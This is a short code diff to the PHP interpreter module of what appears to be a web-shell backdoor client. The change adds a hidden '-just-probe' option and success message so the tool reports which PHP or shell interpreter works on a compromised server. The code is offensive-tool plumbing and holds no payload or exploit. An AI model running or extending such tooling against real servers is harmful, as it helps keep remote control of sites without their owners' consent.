@@ -20,7 +20,8 @@ WARN_NO_RESPONSE = 'No response'
 WARN_UNREACHABLE = 'URL or proxy unreachable'
 WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
 WARN_INVALID_RESPONSE = 'skipping invalid response'
-WARN_PHP_INTERPRETER_FAIL = 'PHP interpreter loading failed'
+WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
+MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'
 WARN_LS_FAIL = 'listing failed, no such file or directory or permission denied'
 WARN_LS_ARGS = 'Error, PHP shell \'ls\' replacement supports only one <path> argument'
 
@@ -36,6 +37,7 @@ class Php(ModuleProbe):
     argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
     argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
     argparser.add_argument('-post', help=SUPPRESS, type=literal_eval, default={})
+    argparser.add_argument('-just-probe', help=SUPPRESS, action='store_true')
 
     def _init_module(self):
         self.stored_args = { 'mode' : None, 'path' : '' }
@@ -58,7 +60,7 @@ class Php(ModuleProbe):
         # Avoid probing (and storing) if mode is specified by user
         
         if not self.args['mode']:
-            if not self.stored_args['mode']:
+            if not self.stored_args['mode'] or self.args['just_probe']:
                 self.__slacky_probe()
                 
             self.args['mode'] = self.stored_args['mode']
@@ -147,6 +149,10 @@ class Php(ModuleProbe):
                 
                 # Set as best interpreter
                 self.modhandler.interpreter = self.name
+                
+                if self.args['just_probe']:
+                    raise ProbeSucceed(self.name, MSG_PHP_INTERPRETER_SUCCEED)
+                
                 return
         
         
